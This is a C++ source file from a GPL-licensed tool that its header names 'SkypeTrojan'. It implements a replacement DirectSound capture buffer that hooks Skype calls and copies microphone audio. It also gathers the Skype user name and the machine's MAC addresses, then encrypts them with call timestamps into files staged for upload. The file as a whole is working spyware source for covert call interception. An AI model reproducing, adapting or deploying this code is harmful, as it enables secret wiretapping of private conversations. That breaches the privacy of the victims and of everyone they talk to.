/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */






#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "IDirectSoundCaptureBufferReplacement.h"
#include "IDirectSoundBufferReplacement.h"
#include "VoIP_Recorder.h"

#include "Crypto.h"

extern bool gInputIsRecording;
extern bool gOutputIsRecording;
extern bool gOutputGotData;
extern bool gInputGotData;

extern char gInAudioBlocksBuffer[MAX_AUDIO_SIZE];
extern char gOutAudioBlocksBuffer[MAX_AUDIO_SIZE];

extern int gInAudioBlocksBufferSize;
extern int gOutAudioBlocksBufferSize;

extern DWORD gBlockCounterInput; 
extern DWORD gBlockCounterOutput;

extern char gInTimeStamp[MAX_BUF_SIZE + 1];
extern SYSTEMTIME gSystemTime;

extern time_t gStartTime;
extern time_t gStopTime;


extern int gCurrentCallID;
extern char gHomeDirectory[MAX_BUF_SIZE + 1];
extern char *gLIID;



/*
 * Constructors + destructor
 *
 */

IDirectSoundCaptureBufferReplacement::IDirectSoundCaptureBufferReplacement()
{
}




/*
 *
 *
 */

IDirectSoundCaptureBufferReplacement::IDirectSoundCaptureBufferReplacement(IDirectSoundCaptureBuffer *pIDirectSoundCaptureBufferOriginal, DWORD pInputDataBufferSize)
{
  mIDirectSoundCaptureBufferOriginal = pIDirectSoundCaptureBufferOriginal;
  mInputDataBufferSize = pInputDataBufferSize;
  mInputAudioDataPointer1 = 0;

  gInAudioBlocksBufferSize = 0;
  mAudioSliceSize = 960;
}




/*
 *
 *
 */

IDirectSoundCaptureBufferReplacement::~IDirectSoundCaptureBufferReplacement()
{
  if (mIDirectSoundCaptureBufferOriginal)
    mIDirectSoundCaptureBufferOriginal->~IDirectSoundCaptureBuffer();
}








/*
 * Lock a data buffer segment in the ring buffer
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::Lock(DWORD dwOffset, DWORD dwBytes, LPVOID *ppvAudioPtr1, LPDWORD  pdwAudioBytes1, LPVOID *ppvAudioPtr2, LPDWORD pdwAudioBytes2, DWORD dwFlags)
{
  HRESULT mRetVal = 0;
  DWORD dwWritten = 0;

  if (mIDirectSoundCaptureBufferOriginal)
  {
    mRetVal = mIDirectSoundCaptureBufferOriginal->Lock(dwOffset, dwBytes, ppvAudioPtr1, pdwAudioBytes1, ppvAudioPtr2, pdwAudioBytes2, dwFlags);

    /*
     * At this point we can grab the address of the data buffer, where input audio data is stored
     *
     */

    if (*ppvAudioPtr1 != NULL && dwOffset == 0 && mInputAudioDataPointer1 == 0)
    {
      mInputAudioDataPointer1 = *ppvAudioPtr1;
      mInputAudioDataSize1 = *pdwAudioBytes1;
      mInputOffset = 0;
    }


    /*
     * Remember how big a audio data slice is.
     *
     */

    mAudioSliceSize = dwBytes;
  } // if (mIDirectSoundCaptureBufferOriginal)

  return(mRetVal);
}





/*
 * Unlock a data buffer segment in the ring buffer
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::Unlock(LPVOID pvAudioPtr1, DWORD dwAudioBytes1, LPVOID pvAudioPtr2, DWORD dwAudioBytes2)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->Unlock(pvAudioPtr1, dwAudioBytes1, pvAudioPtr2, dwAudioBytes2);

  return(mRetVal);
}





/*
 * Start recording
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::Start(DWORD dwFlags)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
  {
    mRetVal = mIDirectSoundCaptureBufferOriginal->Start(dwFlags);

    gInputIsRecording = true;
    gInputGotData = false;
    gOutputGotData = false;


    /*
     * 
     *
     */

    setRecordingMarker(RECORDING_INPUT_SIGN_FILE);
    setRecordingMarker(RECORDING_OUTPUT_SIGN_FILE);

    gInAudioBlocksBufferSize = 0;
    ZeroMemory(gInAudioBlocksBuffer, MAX_AUDIO_SIZE);

    gOutAudioBlocksBufferSize = 0;
    ZeroMemory(gOutAudioBlocksBuffer, MAX_AUDIO_SIZE);


    gBlockCounterInput = 0;
    gBlockCounterOutput = 0;

    gCurrentCallID = getCurrentCallID();


    /*
     * create timestamp & output file
     *
     */

    ZeroMemory(gInTimeStamp, sizeof(gInTimeStamp));
    ZeroMemory(&gSystemTime, sizeof(gSystemTime));

    GetLocalTime(&gSystemTime);
    snprintf(gInTimeStamp, MAX_BUF_SIZE, "%04d-%02d-%02d-%02d-%02d-%02d", gSystemTime.wYear, gSystemTime.wMonth, gSystemTime.wDay, gSystemTime.wHour, gSystemTime.wMinute, gSystemTime.wSecond);
    time(&gStartTime);
  } // if (mIDirectSoundCaptureBufferOriginal)

  return(mRetVal);
}













/*
 * Stop recording.
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::Stop()
{
  HRESULT mRetVal = 0;
  sAudioData *mAudioDataInput; 
  sAudioData *mAudioDataOutput;

  char mMP3FileName[MAX_BUF_SIZE + 1];
  char mCallIDPattern[MAX_BUF_SIZE + 1];
  char mVoiceDirectory[MAX_BUF_SIZE + 1];
  char mCurrentUserName[MAX_BUF_SIZE + 1];
  char mTemp[MAX_BUF_SIZE * 2];
  char mTemp2[MAX_BUF_SIZE];
  char mMACAddresses[MAX_BUF_SIZE + 1];
  char mHeaderData[MAX_BUF_SIZE];
  char *mEncodedAndEncrypted = NULL;
  int mOutputLength = 0;


  if (mIDirectSoundCaptureBufferOriginal)
  {
    mRetVal = mIDirectSoundCaptureBufferOriginal->Stop();
    gInputIsRecording = false;
    gOutputIsRecording = false;
    gInputGotData = false;
    gOutputGotData = false;


    /*
     * Write audio input blocks to buffer
     *
     */

    if (gInAudioBlocksBufferSize > 0)
    {      
      if ((mAudioDataInput = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData))) != NULL)
      {
        ZeroMemory(mAudioDataInput, sizeof(sAudioData));

        if (gInAudioBlocksBufferSize > gOutAudioBlocksBufferSize)
          gInAudioBlocksBufferSize = gOutAudioBlocksBufferSize;

        if ((mAudioDataInput->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gInAudioBlocksBufferSize)) != NULL)
        {
          mAudioDataInput->mAudioDataSize = gInAudioBlocksBufferSize;
          mAudioDataInput->mPacketNumber = gBlockCounterInput;
          mAudioDataInput->mHangUp = 0;
          ZeroMemory(mAudioDataInput->mAudioDataBuffer, gInAudioBlocksBufferSize);
          memcpy(mAudioDataInput->mAudioDataBuffer, gInAudioBlocksBuffer, gInAudioBlocksBufferSize);
          gInAudioBlocksBufferSize = 0;
          ZeroMemory(gInAudioBlocksBuffer, MAX_AUDIO_SIZE);
          writeInputThread(mAudioDataInput);
          gBlockCounterInput++;
	} // if (mAudioDataInput->mAudioDataBuffer != NULL)
      } // if (mAudioDataInput != NULL)
    } // if (gInAudioBlocksBufferSize > 0)



    /*
     * Write audio output blocks to buffer
     *
     */

    if (gOutAudioBlocksBufferSize > 0)
    {
      mAudioDataOutput = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData));
      if (mAudioDataOutput != NULL)
      {
        ZeroMemory(mAudioDataOutput, sizeof(sAudioData));
        mAudioDataOutput->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gOutAudioBlocksBufferSize);
	  
        if (mAudioDataOutput->mAudioDataBuffer != NULL)
        {
          mAudioDataOutput->mPacketNumber = gBlockCounterOutput;
          mAudioDataOutput->mAudioDataSize = gOutAudioBlocksBufferSize;
          mAudioDataOutput->mHangUp = 0;
          ZeroMemory(mAudioDataOutput->mAudioDataBuffer, gOutAudioBlocksBufferSize);
          memcpy(mAudioDataOutput->mAudioDataBuffer, gOutAudioBlocksBuffer, gOutAudioBlocksBufferSize);
          gOutAudioBlocksBufferSize = 0;
          ZeroMemory(gOutAudioBlocksBuffer, MAX_AUDIO_SIZE);
          writeOutputThread(mAudioDataOutput);
          gBlockCounterOutput++;
        } // if (mAudioDataOutput->mAudioDataBuffer != NULL)
      } // if (mAudioDataOutput != NULL)
    } // if (gOutAudioBlocksBufferSize > 0)


    /*
     * Create Input-UPLOADED files, if any datablocks for the current call id exist
     *
     */

    ZeroMemory(mVoiceDirectory, sizeof(mVoiceDirectory));
    strncpy(mVoiceDirectory, gHomeDirectory, sizeof(mVoiceDirectory) - 1);
    if (mVoiceDirectory[strlen(mVoiceDirectory) - 1] != '\\')
      strcat(mVoiceDirectory, "\\");  

    strcat(mVoiceDirectory, UPLOAD_DIRECTORY);

    if (gBlockCounterOutput > 0)
    {

      /*
       * Check if UPLOADED file already exists. if so, dont create it a second time
       *
       */

      ZeroMemory(mCallIDPattern, sizeof(mCallIDPattern));
      snprintf(mCallIDPattern, sizeof(mCallIDPattern) - 1, "A%04d*UI.bin", gCurrentCallID);

      if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
      { 
        // the output filename on the target system
        ZeroMemory(mMP3FileName, sizeof(mMP3FileName)); 
        snprintf(mMP3FileName, MAX_BUF_SIZE, "%sA%04d%04dUI.bin", mVoiceDirectory, gCurrentCallID, gBlockCounterInput);

        // get skype user name
        ZeroMemory(mCurrentUserName, sizeof(mCurrentUserName));
        getActiveUser(mCurrentUserName, sizeof(mCurrentUserName) - 1);
        if (mCurrentUserName[0] == NULL)
          strcpy(mCurrentUserName, "#UNKNOWN#");

        // get all mac addresses
        ZeroMemory(mMACAddresses, sizeof(mMACAddresses));
        getMACAddress(mMACAddresses, sizeof(mMACAddresses));

        // get stop time
        time(&gStopTime);

       ZeroMemory(mTemp, sizeof(mTemp));
       ZeroMemory(mTemp2, sizeof(mTemp2));

      snprintf(mTemp2, sizeof(mTemp2) - 1, "%d,%d,%s,%s", gStartTime, gStopTime, mCurrentUserName, mMACAddresses);

      /*
       * Write the output filename in the header part of the output file.
       *
       */
      ZeroMemory(mHeaderData, sizeof(mHeaderData)); 
      snprintf(mHeaderData, sizeof(mHeaderData) - 1, "%s,%04d-%04d-SkypeIn-%s.mp3,%d", VR_BANNER, gCurrentCallID, gBlockCounterInput, SIGN_UPLOADED, strlen(mTemp2));
      memcpy(mTemp, mHeaderData, sizeof(mHeaderData));


      memcpy(&mTemp[sizeof(mHeaderData)], mTemp2, strlen(mTemp2));
      mEncodedAndEncrypted = encryptAndEncode(sizeof(mHeaderData) + strlen(mTemp2), mTemp, &mOutputLength, gLIID);
      writeDataToFile(mMP3FileName, mEncodedAndEncrypted, mOutputLength);



      if (mEncodedAndEncrypted != NULL)
      {
        HeapFree(GetProcessHeap(), 0, mEncodedAndEncrypted);
        mEncodedAndEncrypted = NULL;
      } // if (mEncodedAndEncrypted != NULL)
    } // if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
  } // if (gBlockCounterOutput > 0)




  /*
   * Create Output-UPLOADED files, if any datablocks for the current call id exist
   *
   */

  if (gBlockCounterInput > 0)
  {
    /*
     * Check if UPLOADED file already exists. if so, dont create it a second time
     *
     */

    ZeroMemory(mCallIDPattern, sizeof(mCallIDPattern));
    snprintf(mCallIDPattern, sizeof(mCallIDPattern) - 1, "A%04d*UO.bin", gCurrentCallID);

    if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
    {
      // the output filename
      ZeroMemory(mMP3FileName, sizeof(mMP3FileName));
      snprintf(mMP3FileName, MAX_BUF_SIZE, "%sA%04d%04dUO.bin", mVoiceDirectory, gCurrentCallID, gBlockCounterOutput);

      // get skype user name
      ZeroMemory(mCurrentUserName, sizeof(mCurrentUserName));
      getActiveUser(mCurrentUserName, sizeof(mCurrentUserName) - 1);
      if (mCurrentUserName[0] == NULL)
        strcpy(mCurrentUserName, "#UNKNOWN#");      


      // get all mac addresses
      ZeroMemory(mMACAddresses, sizeof(mMACAddresses));
      getMACAddress(mMACAddresses, sizeof(mMACAddresses));


      // get stop time
      time(&gStopTime);


      ZeroMemory(mTemp, sizeof(mTemp));
      ZeroMemory(mTemp2, sizeof(mTemp2));

      snprintf(mTemp2, sizeof(mTemp2) - 1, "%d,%d,%s,%s", gStartTime, gStopTime, mCurrentUserName, mMACAddresses);



      /*
       * Wrote the output filename in the header part of the output file
       * 
       */

      ZeroMemory(mHeaderData, sizeof(mHeaderData)); 
      snprintf(mHeaderData, MAX_BUF_SIZE - 1, "%s,%04d-%04d-SkypeOut-%s.mp3,%d", VR_BANNER, gCurrentCallID, gBlockCounterOutput, SIGN_UPLOADED, strlen(mTemp2));
      memcpy(mTemp, mHeaderData, sizeof(mHeaderData));
		
      memcpy(&mTemp[sizeof(mHeaderData)], mTemp2, strlen(mTemp2));
      mEncodedAndEncrypted = encryptAndEncode(sizeof(mHeaderData) + strlen(mTemp2), mTemp, &mOutputLength, gLIID);
      writeDataToFile(mMP3FileName, mEncodedAndEncrypted, mOutputLength);


      if (mEncodedAndEncrypted != NULL)
      {
        HeapFree(GetProcessHeap(), 0, mEncodedAndEncrypted);
        mEncodedAndEncrypted = NULL;
      } // if (mEncodedAndEncrypted != NULL)
    } // if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
  } // if (gBlockCounterInput > 0)


    /*
     * delete any flag files and initialise counters
     *
     */

    deleteAnyRecordingFlag(RECORDING_OUTPUT_SIGN_FILE, "MywaveInClose");
    deleteAnyRecordingFlag(RECORDING_INPUT_SIGN_FILE, "MywaveInClose");

    gBlockCounterInput = 0;
    gBlockCounterOutput = 0;

  } // if (mIDirectSoundCaptureBufferOriginal)

  return(mRetVal);
}




/*
 * Increment the reference counter
 *
 */

ULONG __stdcall IDirectSoundCaptureBufferReplacement::AddRef()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->AddRef();

  return(mRetVal);
}







/*
 * Decrement the reference counter
 *
 */

ULONG __stdcall IDirectSoundCaptureBufferReplacement::Release()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->Release();

  return(mRetVal);
}






/*
 * Get current caps settings
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::GetCaps(LPDSCBCAPS pDSCBCaps)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->GetCaps(pDSCBCaps);

  return(mRetVal);
}






/*
 * Query the DS instance
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::QueryInterface(REFIID iid, void** ppv)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->QueryInterface(iid, ppv);

  return(mRetVal);
}




/*
 * Initialize DS interface
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::Initialize(LPDIRECTSOUNDCAPTURE pDirectSoundCapture, LPCDSCBUFFERDESC pcDSCBufferDesc)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->Initialize(pDirectSoundCapture, pcDSCBufferDesc);

  return(mRetVal);
}





/*
 * Get current position in DS ring buffer
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::GetCurrentPosition(LPDWORD pdwCapturePosition, LPDWORD pdwReadPosition)
{
  HRESULT mRetVal = 0;
  DWORD dwWritten = 0;
  char *mTempPointer = NULL;

  if (mIDirectSoundCaptureBufferOriginal)
  {
    mRetVal = mIDirectSoundCaptureBufferOriginal->GetCurrentPosition(pdwCapturePosition, pdwReadPosition);


    /*
     * Intercept microphone data here!!! and calculate new data offset
     *
     */
  
    if (mInputAudioDataPointer1 != NULL && 
        mInputAudioDataSize1 > 0 && 
        mPreviousReadPosition != *pdwReadPosition)
    {
      gInputGotData = true;
      if (gOutputIsRecording == true && gOutputGotData == true && mAudioSliceSize < MAX_AUDIO_SIZE)  // our buffer has to be big enough to store audio data
      {
        if (gInAudioBlocksBufferSize + mAudioSliceSize <= MAX_AUDIO_SIZE)
        {
          memcpy(&gInAudioBlocksBuffer[gInAudioBlocksBufferSize], (char *) mInputAudioDataPointer1 + mInputOffset, mAudioSliceSize);
          gInAudioBlocksBufferSize += mAudioSliceSize;
        } else {

           /*
            * Write audio blocks to buffer
            *
            */

           if ((mAudioDataInput = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData))) != NULL)
           {
             ZeroMemory(mAudioDataInput, sizeof(sAudioData));

             if ((mAudioDataInput->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gInAudioBlocksBufferSize)) != NULL)
             {
               mAudioDataInput->mPacketNumber = gBlockCounterInput;
               mAudioDataInput->mAudioDataSize = gInAudioBlocksBufferSize;
               mAudioDataInput->mHangUp = 1;
//       ZeroMemory(mAudioData->mAudioDataBuffer, gInAudioBlocksBufferSize);
               memcpy(mAudioDataInput->mAudioDataBuffer, gInAudioBlocksBuffer, gInAudioBlocksBufferSize);
               CreateThread(0, 0, writeInputThread, mAudioDataInput, 0, &mThreadID);
               gBlockCounterInput++;
             } // if ((mAudioDataInput->mAudioDataBuffer = (short * ...
           } // if ((mAudioDataInput = (sAudioData *) HeapAlloc(...


            memcpy(&gInAudioBlocksBuffer[0], (char *) mInputAudioDataPointer1 + mInputOffset, mAudioSliceSize);
            gInAudioBlocksBufferSize = mAudioSliceSize;
          } // if (gInAudioBlocksBufferSize + mAudioSliceSize <= MAX_AUDIO_SIZE)
	} // if (gInputIsRecording == true && mAudioSliceSize < MAX_AUDIO_SIZE)


        /*
         * Recalculate the offset
  	 *
         */

        if (mInputOffset + mAudioSliceSize < mInputDataBufferSize)
          mInputOffset += mAudioSliceSize;
        else
          mInputOffset = 0;

        mPreviousReadPosition = *pdwReadPosition;
      } // if (mInpputAudioDataPointer != NULL && ...
    } // if (mIDirectSoundCaptureBufferOriginal)

  return(mRetVal);
}





/*
 * Get current capture status
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::GetStatus(LPDWORD pdwStatus)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->GetStatus(pdwStatus);

  return(mRetVal);
}





/*
 * Get audio data format
 *
 */

HRESULT __stdcall IDirectSoundCaptureBufferReplacement::GetFormat(LPWAVEFORMATEX pwfxFormat, DWORD dwSizeAllocated, LPDWORD pdwSizeWritten)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureBufferOriginal)
    mRetVal = mIDirectSoundCaptureBufferOriginal->GetFormat(pwfxFormat, dwSizeAllocated, pdwSizeWritten);

  return(mRetVal);
}






/*
 *
 *
 */

void printDebug(char *pMsg, int pMsgLength)
{
  char mTemp[MAX_BUF_SIZE + 1];
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  DWORD dwWritten = 0;

  ZeroMemory(mTemp, sizeof(mTemp));
  strcat(mTemp, "c:\\debug_vr.txt");

  if ((mFileHandle = CreateFile(mTemp, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
  {
    SetFilePointer(mFileHandle,0,0,FILE_END); 
    WriteFile(mFileHandle, pMsg, pMsgLength, &dwWritten, NULL);
    CloseHandle(mFileHandle);
  }
}